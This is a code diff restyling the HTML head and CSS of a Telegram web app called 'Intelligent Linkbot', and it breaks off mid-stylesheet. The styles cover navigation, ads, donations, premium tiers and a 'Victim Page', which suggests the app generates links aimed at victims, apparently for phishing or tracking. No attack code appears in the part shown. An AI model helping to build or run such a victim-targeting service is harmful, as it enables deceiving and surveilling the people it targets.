@@ -1,1543 +1,584 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Intelligent Linkbot - WebApp</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;700&display=swap" rel="stylesheet">
-  <style>
-    /* ── Reset ─────────────────────────────── */
-    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
-
-    /* ── Variables ─────────────────────────── */
-    :root {
-      --bg:        #0d0f14;
-      --surface:   #161a22;
-      --surface2:  #1e2330;
-      --border:    rgba(255,255,255,0.08);
-      --border2:   rgba(255,255,255,0.14);
-      --accent:    #4f8cff;
-      --accent2:   #00e5a0;
-      --danger:    #ff5a5a;
-      --text:      #f0f2f7;
-      --text2:     #b0b8cc;
-      --text3:     #6e7a94;
-      --gold:      #ffc84a;
-      --radius:    12px;
-      --radius-sm: 8px;
-    }
-
-    /* ── Body ──────────────────────────────── */
-    body, html {
-      font-family: 'Inter', sans-serif;
-      background: var(--bg);
-      color: var(--text);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      padding-bottom: 68px;
-      font-size: 15px;
-      line-height: 1.6;
-    }
-
-    /* ── Header ────────────────────────────── */
-    header {
-      background: var(--surface);
-      border-bottom: 1px solid var(--border);
-      padding: 14px 20px;
-      text-align: center;
-      position: sticky;
-      top: 0;
-      z-index: 100;
-    }
-    .header-title {
-      font-family: 'Space Grotesk', sans-serif;
-      font-size: 1.15rem;
-      font-weight: 700;
-      color: var(--text);
-      letter-spacing: 0.5px;
-    }
-    .header-title span {
-      color: var(--accent);
-    }
-
-    /* ── Main ──────────────────────────────── */
-    main {
-      flex: 1;
-      overflow-y: auto;
-      padding: 16px;
-    }
-
-    /* ── Pages ─────────────────────────────── */
-    .page { display: none; max-width: 600px; margin: 0 auto; }
-    .page.active { display: block; }
-
-    /* ── Section Header ─────────────────────── */
-    .section-header {
-      margin-bottom: 16px;
-      text-align: center;
-    }
-    .section-header h2 {
-      font-family: 'Space Grotesk', sans-serif;
-      font-size: 1.3rem;
-      font-weight: 700;
-      color: var(--text);
-      margin-bottom: 4px;
-    }
-    .section-header p {
-      font-size: 0.88rem;
-      color: var(--text3);
-    }
-
-    /* ── Info Card ─────────────────────────── */
-    .info-card {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: var(--radius);
-      padding: 14px 16px;
-      margin-bottom: 12px;
-      font-size: 0.9rem;
-      color: var(--text2);
-      line-height: 1.65;
-    }
-    .info-card strong, .info-card b { color: var(--text); font-weight: 600; }
-    .info-card a { color: var(--accent); text-decoration: none; font-weight: 600; }
-    .info-card a:hover { text-decoration: underline; }
-
-    /* ── Action Button Row ─────────────────── */
-    .action-row {
-      display: flex;
-      gap: 10px;
-      margin-bottom: 14px;
-    }
-    .action-row .btn-primary,
-    .action-row .btn-secondary {
-      flex: 1;
-      text-align: center;
-    }
-
-    /* ── Buttons ───────────────────────────── */
-    .btn-primary {
-      display: inline-block;
-      background: var(--accent);
-      color: #fff;
-      font-size: 0.88rem;
-      font-weight: 700;
-      padding: 11px 18px;
-      border-radius: var(--radius-sm);
-      border: none;
-      cursor: pointer;
-      transition: opacity 0.18s, transform 0.15s;
-      text-decoration: none;
-      letter-spacing: 0.2px;
-      white-space: nowrap;
-    }
-    .btn-primary:hover { opacity: 0.88; transform: translateY(-1px); }
-    .btn-primary:active { transform: scale(0.97); }
-
-    .btn-secondary {
-      display: inline-block;
-      background: var(--surface2);
-      color: var(--text);
-      font-size: 0.88rem;
-      font-weight: 600;
-      padding: 11px 18px;
-      border-radius: var(--radius-sm);
-      border: 1px solid var(--border2);
-      cursor: pointer;
-      transition: background 0.18s, transform 0.15s;
-      text-decoration: none;
-      white-space: nowrap;
-    }
-    .btn-secondary:hover { background: #252b3a; transform: translateY(-1px); }
-
-    /* small btn used in link rows */
-    .btn {
-      background: var(--surface2);
-      color: var(--text);
-      font-size: 0.8rem;
-      font-weight: 600;
-      padding: 7px 13px;
-      border-radius: var(--radius-sm);
-      border: 1px solid var(--border2);
-      cursor: pointer;
-      transition: background 0.15s, color 0.15s;
-      white-space: nowrap;
-    }
-    .btn:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
-    .btn2 {
-      background: var(--surface2);
-      color: var(--text2);
-      font-size: 0.8rem;
-      font-weight: 600;
-      padding: 7px 11px;
-      border-radius: var(--radius-sm);
-      border: 1px solid var(--border);
-      cursor: pointer;
-      transition: background 0.15s;
-    }
-    .btn2:hover { background: #252b3a; }
-    .btn.disabled { opacity: 0.3; cursor: not-allowed; }
-
-    /* ── Link List ─────────────────────────── */
-    ul.link-list {
-      list-style: none;
-      padding: 0;
-      margin: 0;
-      display: flex;
-      flex-direction: column;
-      gap: 10px;
-    }
-    ul.link-list li {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: var(--radius);
-      display: flex;
-      align-items: center;
-      padding: 12px 14px;
-      gap: 12px;
-      transition: border-color 0.2s, background 0.2s;
-    }
-    ul.link-list li:hover {
-      border-color: var(--border2);
-      background: var(--surface2);
-    }
-    ul.link-list li img {
-      width: 42px;
-      height: 42px;
-      border-radius: 10px;
-      object-fit: contain;
-      background: var(--surface2);
-      border: 1px solid var(--border);
-      flex-shrink: 0;
-    }
-    ul.link-list li .link-name {
-      flex: 1;
-      font-size: 0.95rem;
-      font-weight: 600;
-      color: var(--text);
-    }
-    ul.link-list li .btn-group {
-      display: flex;
-      gap: 6px;
-      flex-shrink: 0;
-    }
-
-    /* ── Custom Link Button ─────────────────── */
-    .custom-link-btn {
-      max-width: 600px;
-      margin: 0 auto 14px auto;
-    }
-    .custom-link-btn a {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      background: var(--surface);
-      border: 1px solid var(--border2);
-      border-radius: var(--radius);
-      padding: 13px;
-      color: var(--text);
-      font-weight: 700;
-      font-size: 0.9rem;
-      text-decoration: none;
-      transition: background 0.2s, border-color 0.2s;
-    }
-    .custom-link-btn a:hover {
-      background: var(--surface2);
-      border-color: var(--accent);
-      color: var(--accent);
-    }
-
-    /* ── Donation ──────────────────────────── */
-    .donation-info {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: var(--radius);
-      padding: 20px;
-      text-align: center;
-      color: var(--text2);
-      font-size: 0.95rem;
-      line-height: 1.7;
-    }
-    .donation-info strong { color: var(--text); }
-    .crypto-address {
-      font-family: 'Space Grotesk', monospace;
-      font-size: 0.82rem;
-      background: var(--bg);
-      color: var(--accent2);
-      border: 1px dashed rgba(0,229,160,0.3);
-      border-radius: var(--radius-sm);
-      padding: 12px;
-      margin-top: 12px;
-      word-break: break-all;
-      user-select: all;
-      letter-spacing: 0.4px;
-    }
-
-    /* ── Bottom Nav ────────────────────────── */
-    .bottom-nav {
-      position: fixed;
-      bottom: 0; left: 0; right: 0;
-      height: 64px;
-      background: var(--surface);
-      border-top: 1px solid var(--border);
-      display: flex;
-      align-items: center;
-      justify-content: space-around;
-      padding: 0 4px;
-      z-index: 200;
-    }
-    .bottom-nav button {
-      background: none;
-      border: none;
-      color: var(--text3);
-      font-size: 1.25rem;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      cursor: pointer;
-      transition: color 0.2s;
-      flex: 1;
-      padding: 6px 2px;
-      min-width: 0;
-    }
-    .bottom-nav button span {
-      font-size: 0.56rem;
-      margin-top: 3px;
-      font-weight: 600;
-      letter-spacing: 0.3px;
-      text-transform: uppercase;
-      font-family: 'Inter', sans-serif;
-    }
-    .bottom-nav button.active {
-      color: var(--accent);
-    }
-    .bottom-nav a {
-      flex: 1;
-      text-decoration: none;
-      display: flex;
-    }
-    .bottom-nav a button {
-      color: var(--text3);
-      flex: 1;
-    }
-    .bottom-nav a button:hover { color: var(--accent); }
-
-    /* ── Victim Page ───────────────────────── */
-    .victim-card {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: var(--radius);
-      padding: 24px 20px;
-      text-align: center;
-    }
-    .victim-card .icon {
-      font-size: 2.5rem;
-      margin-bottom: 12px;
-    }
-    .victim-card h3 {
-      font-family: 'Space Grotesk', sans-serif;
-      font-size: 1.1rem;
-      font-weight: 700;
-      color: var(--text);
-      margin-bottom: 10px;
-    }
-    .victim-card p {
-      font-size: 0.92rem;
-      color: var(--text2);
-      margin-bottom: 14px;
-      line-height: 1.65;
-    }
-    .victim-card p strong { color: var(--accent); font-weight: 700; }
-    #openBotBtnVictim {
-      background: var(--accent);
-      color: #fff;
-      font-size: 0.9rem;
-      font-weight: 700;
-      padding: 12px 24px;
-      border-radius: var(--radius-sm);
-      border: none;
-      cursor: pointer;
-      width: 100%;
-      transition: opacity 0.18s;
-    }
-    #openBotBtnVictim:hover { opacity: 0.85; }
-
-    /* Premium modal removed – replaced by WhatsApp popup */
-
-    /* ── Responsive ────────────────────────── */
-    @media (max-width: 400px) {
-      ul.link-list li { flex-wrap: wrap; }
-      ul.link-list li .link-name { width: 100%; }
-    }
-
-    /* ── Profile Card ──────────────────────── */
-    .profile-avatar-wrap {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      margin-bottom: 20px;
-    }
-    .profile-avatar {
-      width: 86px; height: 86px;
-      border-radius: 50%;
-      object-fit: cover;
-      border: 3px solid var(--accent);
-      background: var(--surface2);
-      box-shadow: 0 4px 18px rgba(79,140,255,0.28);
-      margin-bottom: 12px;
-    }
-    .profile-avatar-placeholder {
-      width: 86px; height: 86px;
-      border-radius: 50%;
-      background: linear-gradient(135deg, var(--accent), var(--accent2));
-      display: flex; align-items: center; justify-content: center;
-      font-size: 2.4rem; font-weight: 700; color: #fff;
-      border: 3px solid var(--accent);
-      box-shadow: 0 4px 18px rgba(79,140,255,0.28);
-      margin-bottom: 12px;
-      flex-shrink: 0;
-    }
-    .profile-name {
-      font-family: 'Space Grotesk', sans-serif;
-      font-size: 1.2rem; font-weight: 700; color: var(--text);
-      text-align: center; margin-bottom: 4px;
-    }
-    .profile-username {
-      font-size: 0.88rem; color: var(--accent); font-weight: 600;
-      text-align: center; margin-bottom: 2px;
-    }
-    .profile-premium-badge {
-      display: inline-flex; align-items: center; gap: 5px;
-      background: linear-gradient(135deg, #ffc84a22, #e0a02022);
-      border: 1px solid rgba(255,200,74,0.5);
-      color: var(--gold); font-size: 0.75rem; font-weight: 700;
-      padding: 3px 10px; border-radius: 999px; margin-top: 6px;
-      letter-spacing: 0.4px;
-    }
-    .profile-info-grid {
-      display: flex; flex-direction: column; gap: 10px;
-    }
-    .profile-info-row {
-      background: var(--surface);
-      border: 1px solid var(--border);
-      border-radius: var(--radius);
-      padding: 13px 16px;
-      display: flex; align-items: center; gap: 12px;
-    }
-    .profile-info-icon {
-      font-size: 1.2rem; flex-shrink: 0; width: 28px; text-align: center;
-    }
-    .profile-info-content { flex: 1; min-width: 0; }
-    .profile-info-label {
-      font-size: 0.72rem; color: var(--text3); font-weight: 600;
-      text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 2px;
-    }
-    .profile-info-value {
-      font-size: 0.95rem; color: var(--text); font-weight: 600;
-      overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
-    }
-    .profile-copy-btn {
-      background: var(--surface2); border: 1px solid var(--border2);
-      color: var(--text2); font-size: 0.75rem; font-weight: 600;
-      padding: 5px 10px; border-radius: 6px; cursor: pointer;
-      transition: background 0.15s, color 0.15s; flex-shrink: 0;
-    }
-    .profile-copy-btn:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
-
-    /* ── Ad Nav Info Bar ───────────────────── */
-    #adNavBar {
-      position: fixed;
-      bottom: 64px; /* sits just above the bottom nav */
-      left: 0; right: 0;
-      background: rgba(17, 22, 38, 0.97);
-      border-top: 1px solid rgba(79,140,255,0.2);
-      border-bottom: 1px solid rgba(79,140,255,0.1);
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      padding: 6px 14px;
-      z-index: 190;
-      backdrop-filter: blur(4px);
-    }
-    .ad-nav-pill {
-      background: rgba(79,140,255,0.15);
-      border: 1px solid rgba(79,140,255,0.4);
-      color: #4f8cff;
-      font-size: 0.62rem;
-      font-weight: 800;
-      padding: 2px 7px;
-      border-radius: 999px;
-      letter-spacing: 0.8px;
-      white-space: nowrap;
-      flex-shrink: 0;
-    }
-    .ad-nav-msg {
-      font-size: 0.72rem;
-      color: #6e7a94;
-      line-height: 1.4;
-    }
-    .ad-nav-msg strong { color: #a0aec0; }
-
-    /* Small AD dot on nav buttons that trigger ads */
-    .nav-ad-dot {
-      position: relative;
-    }
-    .nav-ad-dot::after {
-      content: 'AD';
-      position: absolute;
-      top: 2px;
-      right: 2px;
-      background: rgba(79,140,255,0.2);
-      border: 1px solid rgba(79,140,255,0.5);
-      color: #4f8cff;
-      font-size: 0.38rem;
-      font-weight: 900;
-      padding: 1px 3px;
-      border-radius: 3px;
-      letter-spacing: 0.5px;
-      line-height: 1;
-      pointer-events: none;
-    }
-
-    /* Adjust body padding to account for the ad bar */
-    body, html { padding-bottom: 100px; }
-
-    /* ── Ad Notice Modal ───────────────────── */
-    #adNoticeOverlay {
-      position: fixed;
-      inset: 0;
-      background: rgba(0,0,0,0.82);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 999999;
-      backdrop-filter: blur(6px);
-      padding: 20px;
-      animation: adFadeIn 0.25s ease forwards;
-    }
-    #adNoticeOverlay.show { display: flex; }
-    @keyframes adFadeIn { from { opacity:0; } to { opacity:1; } }
-
-    .ad-notice-box {
-      background: #1a1f2e;
-      border: 1px solid rgba(79,140,255,0.35);
-      border-radius: 20px;
-      width: 100%;
-      max-width: 380px;
-      overflow: hidden;
-      animation: adSlideUp 0.35s cubic-bezier(0.34,1.56,0.64,1);
-      box-shadow: 0 20px 60px rgba(0,0,0,0.6), 0 0 0 1px rgba(79,140,255,0.15);
-    }
-    @keyframes adSlideUp {
-      from { transform: translateY(60px) scale(0.95); opacity:0; }
-      to   { transform: translateY(0) scale(1); opacity:1; }
-    }
-
-    /* Top warning banner */
-    .ad-notice-banner {
-      background: linear-gradient(135deg, #1a2340, #222d4a);
-      border-bottom: 1px solid rgba(79,140,255,0.2);
-      padding: 16px 18px 14px;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-    }
-    .ad-notice-badge {
-      background: rgba(79,140,255,0.15);
-      border: 1px solid rgba(79,140,255,0.4);
-      color: #4f8cff;
-      font-size: 0.7rem;
-      font-weight: 800;
-      padding: 4px 9px;
-      border-radius: 999px;
-      letter-spacing: 1px;
-      text-transform: uppercase;
-      flex-shrink: 0;
-    }
-    .ad-notice-banner p {
-      font-size: 0.78rem;
-      color: #8896b0;
-      line-height: 1.4;
-      margin: 0;
-    }
-    .ad-notice-banner p strong { color: #a8b8d8; }
-
-    /* Main body */
-    .ad-notice-body {
-      padding: 20px 20px 22px;
-      text-align: center;
-    }
-    .ad-notice-icon {
-      font-size: 2.8rem;
-      margin-bottom: 10px;
-      filter: drop-shadow(0 4px 10px rgba(0,0,0,0.4));
-    }
-    .ad-notice-body h3 {
-      font-family: 'Space Grotesk', sans-serif;
-      font-size: 1.05rem;
-      font-weight: 700;
-      color: #f0f2f7;
-      margin-bottom: 8px;
-    }
-    .ad-notice-body > p {
-      font-size: 0.85rem;
-      color: #8896b0;
-      line-height: 1.6;
-      margin-bottom: 18px;
-    }
-    .ad-notice-body > p strong { color: #c0cce0; }
-
-    /* Countdown ring */
-    .ad-countdown-wrap {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 14px;
-      background: rgba(79,140,255,0.07);
-      border: 1px solid rgba(79,140,255,0.18);
-      border-radius: 14px;
-      padding: 14px 18px;
-      margin-bottom: 16px;
-    }
-    .ad-timer-circle {
-      width: 52px; height: 52px;
-      border-radius: 50%;
-      background: conic-gradient(#4f8cff var(--p,100%), rgba(79,140,255,0.12) 0%);
-      display: flex; align-items: center; justify-content: center;
-      position: relative;
-      flex-shrink: 0;
-      transition: background 0.5s linear;
-    }
-    .ad-timer-circle::after {
-      content: '';
-      position: absolute;
-      inset: 6px;
-      background: #1a2340;
-      border-radius: 50%;
-    }
-    .ad-timer-num {
-      position: relative;
-      z-index: 1;
-      font-family: 'Space Grotesk', sans-serif;
-      font-size: 1.1rem;
-      font-weight: 700;
-      color: #4f8cff;
-    }
-    .ad-countdown-text {
-      text-align: left;
-      flex: 1;
-    }
-    .ad-countdown-text strong {
-      display: block;
-      font-size: 0.88rem;
-      color: #d0daf0;
-      font-weight: 600;
-      margin-bottom: 2px;
-    }
-    .ad-countdown-text span {
-      font-size: 0.78rem;
-      color: #6e7a94;
-    }
-
-    /* Buttons */
-    .ad-btn-now {
-      display: block;
-      width: 100%;
-      background: linear-gradient(135deg, #4f8cff, #3a6de0);
-      color: #fff;
-      font-weight: 700;
-      font-size: 0.9rem;
-      padding: 13px;
-      border: none;
-      border-radius: 12px;
-      cursor: pointer;
-      margin-bottom: 10px;
-      transition: opacity 0.2s, transform 0.15s;
-      box-sizing: border-box;
-    }
-    .ad-btn-now:hover { opacity: 0.9; transform: translateY(-1px); }
-
-    .ad-btn-wait {
-      display: block;
-      width: 100%;
-      background: transparent;
-      color: #6e7a94;
-      font-size: 0.82rem;
-      font-weight: 500;
-      padding: 8px;
-      border: none;
-      cursor: default;
-      text-align: center;
-      box-sizing: border-box;
-    }
-    .ad-btn-wait.ready {
-      color: #b0b8cc;
-      cursor: pointer;
-      text-decoration: underline;
-    }
-
-    /* Disclaimer strip */
-    .ad-disclaimer {
-      background: rgba(255,90,90,0.06);
-      border-top: 1px solid rgba(255,90,90,0.15);
-      padding: 10px 18px;
-      font-size: 0.75rem;
-      color: #7a5a5a;
-      text-align: center;
-      line-height: 1.5;
-    }
-    .ad-disclaimer strong { color: #c07070; }
-  </style>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no"/>
+  <title>Intelligent Linkbot — Dashboard</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="preconnect" href="https://telegram.org">
+  <link rel="preconnect" href="https://intelseller.com">
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@600;700;800&family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+    :root{
+      --bg:#0d1117;--surf:#161b22;--s2:#21262d;--s3:#30363d;
+      --acc:#00d4aa;--gold:#ffc107;--red:#f85149;--blue:#58a6ff;
+      --text:#e6edf3;--sub:#8b949e;--bdr:#30363d;
+    }
+    html,body{min-height:100%;background:var(--bg);color:var(--text);font-family:'DM Sans',sans-serif;font-size:15px;line-height:1.5;}
+    body{display:flex;flex-direction:column;padding-bottom:calc(94px + env(safe-area-inset-bottom,0px));}
+
+    /* ── TOPBAR ── */
+    .topbar{background:var(--surf);border-bottom:1px solid var(--bdr);padding:10px 14px;display:flex;align-items:center;gap:10px;position:sticky;top:0;z-index:100;}
+    .topbar-brand{flex:1;font-family:'Syne',sans-serif;font-weight:800;font-size:14px;color:var(--text);display:flex;align-items:center;gap:5px;overflow:hidden;white-space:nowrap;}
+    .topbar-brand span{color:var(--acc);}
+    #profileBtn{width:34px;height:34px;border-radius:50%;border:2px solid var(--bdr);background:linear-gradient(135deg,var(--acc),#009e7e);cursor:pointer;overflow:hidden;display:flex;align-items:center;justify-content:center;font-size:14px;font-weight:800;color:#000;font-family:'Syne',sans-serif;padding:0;flex-shrink:0;transition:border-color .2s,transform .15s;-webkit-tap-highlight-color:transparent;}
+    #profileBtn:active{transform:scale(.9);}
+    #profileBtn img{width:100%;height:100%;object-fit:cover;border-radius:50%;}
+
+    /* ── BOTTOM NAV ── */
+    #bottomNav{position:fixed;bottom:0;left:0;right:0;z-index:200;background:var(--surf);border-top:1px solid var(--bdr);display:flex;align-items:stretch;padding-bottom:env(safe-area-inset-bottom,0);height:calc(62px + env(safe-area-inset-bottom,0));}
+    .bnav-btn{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:3px;background:none;border:none;color:var(--sub);font-size:9.5px;font-weight:600;cursor:pointer;font-family:'DM Sans',sans-serif;padding:8px 2px 6px;text-decoration:none;transition:color .15s;-webkit-tap-highlight-color:transparent;}
+    .bnav-btn:active{background:rgba(255,255,255,.04);}
+    .bnav-btn.active{color:var(--acc);}
+    .bnav-icon{font-size:19px;line-height:1;}
+    .bnav-label{line-height:1;white-space:nowrap;}
+
+    /* ── MAIN ── */
+    main{flex:1;padding:14px;max-width:520px;margin:0 auto;width:100%;}
+    .page{display:none;}
+    .page.active{display:block;}
+
+    /* ── TOAST ── */
+    #toast{position:fixed;bottom:calc(62px + env(safe-area-inset-bottom,0px) + 12px);left:50%;transform:translateX(-50%) translateY(60px);background:var(--s2);border:1px solid var(--bdr);border-radius:20px;padding:9px 18px;font-size:13px;font-weight:700;color:var(--text);z-index:99999;transition:.3s;opacity:0;pointer-events:none;white-space:nowrap;}
+    #toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
+    #toast.suc{background:rgba(0,212,170,.15);border-color:rgba(0,212,170,.4);color:var(--acc);}
+    #toast.err{background:rgba(248,81,73,.15);border-color:rgba(248,81,73,.35);color:var(--red);}
+
+    /* ── INFO BOX ── */
+    .info-box{background:rgba(88,166,255,.07);border:1px solid rgba(88,166,255,.2);border-radius:10px;padding:11px 14px;font-size:0.83rem;color:var(--sub);margin-bottom:12px;line-height:1.6;}
+    .info-box b,.info-box strong{color:var(--blue);}
+    .info-box a{color:var(--acc);font-weight:700;text-decoration:none;}
+
+    /* ── BUTTONS ── */
+    .btn-acc{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:13px 16px;background:var(--acc);color:#000;border:none;border-radius:12px;font-size:14px;font-weight:800;cursor:pointer;font-family:'DM Sans',sans-serif;margin-bottom:10px;transition:opacity .18s,transform .15s;text-decoration:none;}
+    .btn-acc:active{transform:scale(.97);opacity:.88;}
+    .btn-outline{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:12px 16px;background:none;color:var(--text);border:1px solid var(--bdr);border-radius:12px;font-size:13px;font-weight:600;cursor:pointer;font-family:'DM Sans',sans-serif;margin-bottom:12px;text-decoration:none;transition:background .15s;}
+    .btn-outline:active{background:var(--s2);}
+
+    /* ── TOOL ROW LIST ── */
+    .tool-group{background:var(--surf);border:1px solid var(--bdr);border-radius:12px;overflow:hidden;margin-bottom:14px;}
+    .tool-row{display:flex;align-items:center;gap:12px;padding:11px 14px;border-bottom:1px solid rgba(255,255,255,.05);transition:background .15s;}
+    .tool-row:last-child{border-bottom:none;}
+    .tool-row:active{background:var(--s2);}
+    .tool-icon{width:36px;height:36px;border-radius:9px;object-fit:cover;background:var(--s2);border:1px solid var(--bdr);flex-shrink:0;}
+    .tool-info{flex:1;min-width:0;}
+    .tool-name{font-size:13px;font-weight:700;color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+    .tool-sub{font-size:11px;color:var(--sub);margin-top:2px;}
+    .tool-btns{display:flex;gap:5px;flex-shrink:0;}
+    .tb{padding:5px 11px;border-radius:7px;font-size:11px;font-weight:700;cursor:pointer;font-family:'DM Sans',sans-serif;border:1px solid var(--bdr);background:var(--s2);color:var(--text);transition:background .15s,color .15s,border-color .15s;white-space:nowrap;}
+    .tb:active{transform:scale(.96);}
+    .tb.open-btn{background:rgba(0,212,170,.1);border-color:rgba(0,212,170,.3);color:var(--acc);}
+
+    /* ── CHIPS ── */
+    .chip-gold{display:inline-flex;align-items:center;background:rgba(255,193,7,.12);border:1px solid rgba(255,193,7,.3);border-radius:20px;padding:2px 7px;font-size:9.5px;font-weight:800;color:var(--gold);}
+    .chip-acc{display:inline-flex;align-items:center;background:rgba(0,212,170,.1);border:1px solid rgba(0,212,170,.25);border-radius:20px;padding:2px 7px;font-size:9.5px;font-weight:800;color:var(--acc);}
+
+    /* ── TG BOT BANNER ── */
+    .tg-bot-banner{background:linear-gradient(135deg,#1a2a3a,#1e2d40);border:1px solid rgba(41,182,246,.25);border-radius:14px;padding:14px 14px 12px;margin-bottom:14px;overflow:hidden;position:relative;}
+    .tg-bot-banner::before{content:'';position:absolute;top:-30px;right:-30px;width:90px;height:90px;border-radius:50%;background:radial-gradient(circle,rgba(41,182,246,.15),transparent 70%);pointer-events:none;}
+    .tg-bot-header{display:flex;align-items:center;gap:10px;margin-bottom:10px;}
+    .tg-bot-avatar{width:42px;height:42px;border-radius:50%;background:linear-gradient(135deg,#29b6f6,#0277bd);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0;box-shadow:0 2px 8px rgba(41,182,246,.35);}
+    .tg-bot-name{font-weight:700;font-size:13px;color:var(--text);display:flex;align-items:center;gap:5px;}
+    .tg-bot-verified{color:#29b6f6;font-size:12px;}
+    .tg-bot-username{font-size:11px;color:var(--sub);margin-top:1px;}
+    .tg-bot-online{display:flex;align-items:center;gap:4px;font-size:10px;color:#4caf50;font-weight:600;margin-top:2px;}
+    .tg-online-dot{width:6px;height:6px;border-radius:50%;background:#4caf50;animation:onlinePulse 2s ease-in-out infinite;}
+    @keyframes onlinePulse{0%,100%{opacity:1}50%{opacity:.4}}
+    .tg-bot-desc{font-size:11.5px;color:var(--sub);line-height:1.55;margin-bottom:10px;}
+    .tg-bot-desc b{color:#29b6f6;}
+    .tg-start-btn{width:100%;padding:10px 14px;background:linear-gradient(135deg,#29b6f6,#0288d1);border:none;border-radius:10px;color:#fff;font-size:13px;font-weight:800;cursor:pointer;font-family:'DM Sans',sans-serif;display:flex;align-items:center;justify-content:center;gap:8px;text-decoration:none;box-shadow:0 3px 10px rgba(41,182,246,.3);-webkit-tap-highlight-color:transparent;}
+    .tg-start-btn:active{transform:scale(.97);}
+
+    /* ── VICTIM PAGE ── */
+    .victim-card{background:var(--surf);border:1px solid var(--bdr);border-radius:14px;padding:24px 18px;text-align:center;margin-bottom:14px;}
+    .victim-card .vc-icon{font-size:2.2rem;margin-bottom:12px;}
+    .victim-card h3{font-family:'Syne',sans-serif;font-weight:800;font-size:1rem;color:var(--text);margin-bottom:10px;}
+    .victim-card p{font-size:0.84rem;color:var(--sub);margin-bottom:10px;line-height:1.65;}
+    .victim-card p strong{color:var(--acc);}
+    #openBotBtnVictim{width:100%;padding:13px;background:var(--acc);color:#000;border:none;border-radius:12px;font-size:14px;font-weight:800;cursor:pointer;font-family:'DM Sans',sans-serif;}
+    #openBotBtnVictim:active{opacity:.85;}
+
+    /* ── DONATE PAGE ── */
+    .donate-card{background:var(--surf);border:1px solid var(--bdr);border-radius:14px;overflow:hidden;margin-bottom:14px;}
+    .donate-card-head{background:linear-gradient(135deg,rgba(255,193,7,.12),rgba(255,193,7,.04));border-bottom:1px solid rgba(255,193,7,.2);padding:16px 18px;text-align:center;}
+    .donate-card-head .d-icon{font-size:2rem;margin-bottom:6px;}
+    .donate-card-head h3{font-family:'Syne',sans-serif;font-weight:800;font-size:1rem;color:var(--gold);}
+    .donate-rows{padding:4px 0;}
+    .donate-row{display:flex;justify-content:space-between;align-items:center;padding:11px 18px;border-bottom:1px solid rgba(255,255,255,.05);font-size:13px;}
+    .donate-row:last-child{border-bottom:none;}
+    .dr-label{color:var(--sub);font-size:12px;font-weight:600;}
+    .dr-val{font-weight:700;color:var(--text);}
+    .acct-number{font-family:'Syne',sans-serif;font-size:22px;font-weight:800;color:var(--acc);text-align:center;padding:10px 18px 6px;}
+    .crypto-addr{font-family:monospace;font-size:11px;color:var(--blue);word-break:break-all;padding:10px 18px;line-height:1.7;}
+    .copy-row-btn{width:calc(100% - 36px);margin:0 18px 14px;padding:10px;background:rgba(0,212,170,.1);border:1px solid rgba(0,212,170,.3);border-radius:10px;color:var(--acc);font-size:13px;font-weight:700;cursor:pointer;font-family:'DM Sans',sans-serif;}
+    .copy-row-btn:active{background:rgba(0,212,170,.2);}
+
+    /* ── PREMIUM — LOCKED ── */
+    .pm-hero{background:linear-gradient(135deg,rgba(255,193,7,.14),rgba(255,193,7,.04));border:1.5px solid rgba(255,193,7,.35);border-radius:16px;padding:24px 18px;text-align:center;margin-bottom:14px;position:relative;overflow:hidden;}
+    .pm-hero::before{content:'';position:absolute;top:-40px;right:-40px;width:120px;height:120px;border-radius:50%;background:radial-gradient(circle,rgba(255,193,7,.2),transparent 70%);pointer-events:none;}
+    .pm-hero-icon{font-size:2.8rem;margin-bottom:8px;}
+    .pm-hero-title{font-family:'Syne',sans-serif;font-weight:800;font-size:1.25rem;color:var(--gold);margin-bottom:6px;}
+    .pm-hero-sub{font-size:12px;color:var(--sub);line-height:1.6;}
+    .pm-features{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px;}
+    .pm-feat{background:var(--surf);border:1px solid var(--bdr);border-radius:12px;padding:14px 12px;}
+    .pm-feat-icon{font-size:1.5rem;margin-bottom:6px;}
+    .pm-feat-title{font-size:12px;font-weight:700;color:var(--text);margin-bottom:3px;}
+    .pm-feat-desc{font-size:11px;color:var(--sub);line-height:1.5;}
+    .pm-invite{background:var(--surf);border:1px solid var(--bdr);border-radius:14px;padding:16px;margin-bottom:12px;}
+    .pm-invite-title{font-family:'Syne',sans-serif;font-weight:700;font-size:14px;color:var(--text);margin-bottom:4px;}
+    .pm-invite-sub{font-size:12px;color:var(--sub);margin-bottom:12px;line-height:1.5;}
+    .pm-invite-row{display:flex;gap:8px;}
